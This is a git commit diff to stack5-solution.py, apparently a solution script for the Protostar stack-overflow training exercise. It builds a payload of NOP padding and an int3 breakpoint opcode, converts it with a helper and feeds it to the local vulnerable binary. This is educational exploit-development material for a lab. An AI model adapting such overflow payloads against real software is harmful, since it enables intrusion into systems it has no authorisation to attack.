35bf0e6f896ee43c3ffa20a005265ef48608bc78
hark130 <hark130@yahoo.com>
2018-08-04 08:09:54 -0500

    master: Added Opcoad call to stack5 solution
    Changes to be committed:
    	modified:   stack5-solution.py

--- protostar-bin/stack5-solution.py
+++ protostar-bin/stack5-solution.py
@@ -1,5 +1,6 @@
 #!/usr/bin/python
 
+from Opcoad import convert_opcode
 from subprocess import Popen
 from subprocess import PIPE
 import os                                                                                        # os.path.join(), os.getcwd()
@@ -12,13 +13,18 @@ def main():
     # LOCAL VARIABLES
     currEnv = os.environ.copy()
     absBinFilename = os.path.join(os.getcwd(), BINARY_NAME)
-    shellCode = pack("I", 0x909090CC)
-    payload = ("HarkRulz" * 8) + ("hark" * 3) + shellCode
+    # shellCode = pack("I", 0x909090CC)
+    shellCode = "909090CC"
+    # payload = ("HarkRulz" * 8) + ("hark" * 3) + shellCode
+    payload = "90" * 32 + "90" * 6 + shellCode
     commandList = []
 
     # VERIFY FILE    
     if not os.path.isfile(absBinFilename):
         raise IOError("{} not found".format(absBinFilename))
+
+    # CONVERT PAYLOAD
+    payload = convert_opcode(payload, "90")
 
     # RUN IT
     commandList.append(absBinFilename)
